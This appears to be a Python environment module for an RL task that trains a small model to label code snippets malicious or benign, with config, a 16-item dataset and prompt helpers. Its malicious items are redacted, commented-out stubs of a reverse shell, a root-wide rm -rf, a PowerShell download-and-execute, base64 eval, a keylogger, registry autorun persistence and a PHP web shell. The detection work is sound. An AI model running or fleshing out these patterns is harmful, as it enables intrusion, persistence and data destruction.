"""Environment helpers for a minimal ART task: malicious code classification.

This package defines small utilities and configuration that a host training
script (provided by the project) can import. It seeds a compact dataset of
benign vs. malicious-leaning code snippets (sanitized stubs) and exposes
helpers to format prompts and select examples deterministically by step.

Notes:
- Examples that represent malware techniques are deliberately non-functional
  and partially redacted to avoid misuse. They are sufficient for learning
  the classification pattern without enabling execution.
- Assume a LocalBackend for inference/training. If tuning memory values like
  GPU fragmentation workarounds are needed, copy patterns from 2048.py in ART.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import TypedDict


# -----------------------------
# Tunables and training config
# -----------------------------
RANDOM_SEED: int = 17

# Minimal training configuration consumed by the host trainer.
# Keep names succinct; models can be swapped easily.
TRAINING_CONFIG: dict = {
    "project": "malicious-code-classifier",
    "model_name": "agent-mcode-001",
    "base_model": "Qwen/Qwen2.5-1.5B",
    "steps": 18,
    "trajectories_per_group": 8,
    "groups_per_step": 2,
    "learning_rate": 1e-5,
    "max_completion_tokens": 128,
    "temperature": 0.2,
    "top_p": 0.9,
    "max_exceptions": 8,
    # The host trainer may delete old checkpoints; keep last for safety.
    "cleanup_keep_last": True,
}


class Example(TypedDict):
    """Dataset item for a single episode.

    - code: the snippet text (kept short where possible)
    - language: a hint for formatting
    - filename: lightweight context
    - is_malicious: ground-truth boolean label
    - id: stable integer identifier
    """

    id: int
    language: str
    filename: str
    code: str
    is_malicious: bool


# Seed the environment with a compact, curated set of sanitized examples.
# Malicious-leaning items include redactions/placeholder markers to avoid
# providing actionable details while preserving recognizable signals.
EXAMPLES: list[Example] = [
    {
        "id": 1,
        "language": "python",
        "filename": "utils/math_ops.py",
        "code": """
def factorial(n: int) -> int:
    if n < 0:
        raise ValueError("n must be non-negative")
    result = 1
    for i in range(2, n + 1):
        result *= i
    return result
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 2,
        "language": "python",
        "filename": "net/rev_shell_stub.py",
        "code": """
# Illustrative, NON-FUNCTIONAL stub (redacted): reverse shell style behavior.
import socket, subprocess

def connect_back():
    s = socket.socket()
    addr = ("<redacted-ip>", <redacted-port>)  # redacted
    # s.connect(addr)  # intentionally disabled
    # While connected, pipe a shell (redacted):
    # subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno())
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 3,
        "language": "javascript",
        "filename": "web/sanitize.js",
        "code": """
export function sanitize(input) {
  return String(input).replace(/[<>\\\\]/g, "");
}
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 4,
        "language": "bash",
        "filename": "scripts/cleanup.sh",
        "code": """
#!/usr/bin/env bash
set -euo pipefail
find /var/log -type f -name "*.log" -mtime +7 -print -delete
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 5,
        "language": "bash",
        "filename": "scripts/danger_rm_stub.sh",
        "code": """
#!/usr/bin/env bash
# NON-FUNCTIONAL example: dangerous broad deletion (redacted)
# DO NOT RUN
# rm -rf --no-preserve-root /
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 6,
        "language": "python",
        "filename": "core/config_loader.py",
        "code": """
import json, pathlib

def load_config(path: str) -> dict:
    p = pathlib.Path(path)
    return json.loads(p.read_text())
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 7,
        "language": "powershell",
        "filename": "ps/download_exec_stub.ps1",
        "code": """
# NON-FUNCTIONAL, redacted: download-and-execute pattern
# $u = "http://<redacted-host>/<redacted>.exe"
# (New-Object Net.WebClient).DownloadFile($u, "$env:TEMP\\x.exe")
# Start-Process "$env:TEMP\\x.exe"
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 8,
        "language": "python",
        "filename": "security/hash.py",
        "code": """
import hashlib

def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 9,
        "language": "python",
        "filename": "obf/eval_stub.py",
        "code": """
# Suspicious dynamic eval with redacted payload
import base64
payload = "<redacted-base64>"
# eval(compile(base64.b64decode(payload), "<string>", "exec"))
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 10,
        "language": "go",
        "filename": "cmd/hello/main.go",
        "code": """
package main
import "fmt"
func main(){ fmt.Println("hello") }
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 11,
        "language": "python",
        "filename": "keylog/stub.py",
        "code": """
# NON-FUNCTIONAL keylogger-like stub (redacted)
# from pynput import keyboard
# def on_press(key): pass
# with keyboard.Listener(on_press=on_press) as l: l.join()
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 12,
        "language": "ruby",
        "filename": "lib/strings.rb",
        "code": """
def titlecase(s)
  s.split.map(&:capitalize).join(' ')
end
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 13,
        "language": "python",
        "filename": "persist/autorun_stub.py",
        "code": """
# Persistence via autorun (redacted, non-functional)
# import winreg
# key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
# winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, "<redacted>")
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 14,
        "language": "python",
        "filename": "cli/main.py",
        "code": """
import argparse

def main():
    p = argparse.ArgumentParser()
    p.add_argument("name")
    args = p.parse_args()
    print(f"Hello {args.name}")

if __name__ == "__main__":
    main()
""".strip(),
        "is_malicious": False,
    },
    {
        "id": 15,
        "language": "php",
        "filename": "web/shell_stub.php",
        "code": """
<?php // NON-FUNCTIONAL web shell-like stub (redacted)
// $cmd = $_GET['c'] ?? '';
// system($cmd); // redacted
?>
""".strip(),
        "is_malicious": True,
    },
    {
        "id": 16,
        "language": "python",
        "filename": "metrics/avg.py",
        "code": """
def average(xs: list[float]) -> float:
    return sum(xs) / len(xs) if xs else 0.0
""".strip(),
        "is_malicious": False,
    },
]


@dataclass(frozen=True)
class SelectedExample:
    """Lightweight container for the selected episode example."""

    id: int
    language: str
    filename: str
    code: str
    label: bool


def select_example_for_step(step: int) -> SelectedExample:
    """Deterministically pick an example for a given training step.

    We cycle through the dataset so that each step uses a different item,
    ensuring coverage across short training runs without relying on external
    randomness.
    """

    idx = step % len(EXAMPLES)
    item = EXAMPLES[idx]
    return SelectedExample(
        id=item["id"],
        language=item["language"],
        filename=item["filename"],
        code=item["code"],
        label=bool(item["is_malicious"]),
    )


def system_prompt() -> str:
    """Concise rubric for JSON-only maliciousness judgments.

    The policy expects exactly one JSON object:
    {"is_malicious": <bool>, "explanation": "<short>"}
    """

    return (
        "You are a security reviewer. Classify the code as malicious or benign. "
        "Reply with one JSON object only: {\"is_malicious\": <true|false>, "
        "\"explanation\": \"<=160 chars, clear reason\"}. "
        "No extra keys, no prose, no code fences."
    )


def user_prompt(language: str, filename: str, code: str) -> str:
    """Format the user message with minimal context and the snippet."""

    header = f"language: {language}\nfilename: {filename}\n"
    return f"{header}\nSnippet:\n```{language}\n{code}\n```"


def safe_truncate(text: str, limit: int) -> str:
    """Return text truncated to limit characters (for metadata)."""

    return text if len(text) <= limit else text[: max(0, limit - 1)] + "…"

